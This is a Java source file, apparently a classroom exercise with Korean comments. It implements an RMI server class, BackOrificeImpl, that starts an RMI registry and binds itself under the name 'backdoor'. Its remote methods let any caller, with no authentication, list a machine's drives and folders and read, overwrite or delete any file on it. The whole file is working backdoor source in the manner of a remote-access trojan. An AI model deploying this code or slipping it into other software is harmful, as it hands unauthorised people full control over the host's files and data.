/*
 * Created on 2005. 11. 25.
 *
 * To change the template for this generated file go to
 * Window&gt;Preferences&gt;Java&gt;Code Generation&gt;Code and Comments
 */
package back.util;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.Vector;

/**
 * @author kimsh
 *
 * To change the template for this generated type comment go to
 * Window&gt;Preferences&gt;Java&gt;Code Generation&gt;Code and Comments
 */
public class BackOrificeImpl extends UnicastRemoteObject implements BackOrifice {
	public BackOrificeImpl() throws RemoteException {}
	
	public static void main(String[] args) {
		try {
			//현재 클래스의 객체(servent 객체) 생성
			BackOrificeImpl boi = new BackOrificeImpl();
			//RMIRegistry 실행
			Runtime rt = Runtime.getRuntime();
			rt.exec(
			  "c:\\java\\Java\\jdk1.8.0_91\\bin\\rmiregistry.exe");
			//servent 객체 Binding
			System.out.println("Server Ready...");
			java.rmi.Naming.rebind("backdoor", boi); 
		}catch(RemoteException ee) {
		}catch(java.io.IOException ee) {}
	}
	/* (non-Javadoc)
	 * @see back.util.BackOrifice#getRoots()
	 */
	public Vector getRoots() throws RemoteException {
		// TODO Auto-generated method stub
		Vector vc = new Vector();
		//현재 루트
		java.io.File[] f = java.io.File.listRoots();
		for(int i = 0; i < f.length; i++)
			vc.add(f[i].toString());
		return vc;
	}
	/* (non-Javadoc)
	 * @see back.util.BackOrifice#getFolders(java.lang.String)
	 */
	public Vector getFolders(String path) throws RemoteException {
		// TODO Auto-generated method stub
		Vector vc = new Vector();
		java.io.File[] f = 
					new java.io.File(path).listFiles();
		for(int i = 0; i < f.length; i++)
			if(f[i].isDirectory()) 
				vc.add(f[i].getName()); 
		return vc;
	}
	/* (non-Javadoc)
	 * @see back.util.BackOrifice#getFiles(java.lang.String)
	 */
	public Vector getFiles(String path) throws RemoteException {
		// TODO Auto-generated method stub
		Vector vc = new Vector();
		java.io.File[] f = 
					new java.io.File(path).listFiles();
		for(int i = 0; i < f.length; i++)
			if(f[i].isFile()) vc.add(f[i].getName()); 
		return vc;
	}
	/* (non-Javadoc)
	 * @see back.util.BackOrifice#getContents(java.lang.String, java.lang.String)
	 */
	public String getContents(String path, String filename) throws RemoteException {
		// TODO Auto-generated method stub
		java.io.File f = new java.io.File(path, filename);
		StringBuffer sb = new StringBuffer();
		try {
			java.io.BufferedReader in = 
							new java.io.BufferedReader(
							new java.io.FileReader(f));
			while(true) {
				String data = in.readLine();
				if(data == null) break;
				sb.append(data + "\n");
			}
			in.close();
		}catch(java.io.IOException ee) {
			return null;
		}
		return sb.toString();
	}
	/* (non-Javadoc)
	 * @see back.util.BackOrifice#setContents(java.lang.String, java.lang.String, java.lang.String)
	 */
	public boolean setContents(String path,
					 String filename, String contents) throws RemoteException {
		// TODO Auto-generated method stub
		java.io.File f = new java.io.File(path, filename);
		if(!f.exists()) return false;
		try {
			java.io.PrintWriter out = 
				new java.io.PrintWriter(
				new java.io.BufferedWriter(
				new java.io.FileWriter(f)));
			out.println(contents);
			out.close();
		}catch(java.io.IOException ee) {
			return false;
		}
		return true;
	}
	/* (non-Javadoc)
	 * @see back.util.BackOrifice#delFile(java.lang.String, java.lang.String)
	 */
	public boolean delFile(String path, String filename) throws RemoteException {
		// TODO Auto-generated method stub
		java.io.File f = new java.io.File(path, filename);
		if(!f.exists()) return false;
		f.delete();
		return true;
	}
	public StringBuffer getData(String path, 
			String filename) throws RemoteException {
		java.io.File f = 
			new java.io.File(path, filename);
		if(!f.exists()) return null;		
		StringBuffer sb = new StringBuffer();
		try {
			java.io.DataInputStream dis = 
				new java.io.DataInputStream(
				new java.io.BufferedInputStream(
				new java.io.FileInputStream(f)));
			byte[] by = new byte[2048];
			while(true) {
				int xx = dis.read(by, 0, 2048);
				if(xx == -1) break;
				String str = new String(by, 0, xx);
				sb.append(str);
			}
			dis.close();
		}catch(java.io.IOException ee) {}		 
		return sb;
	}
}
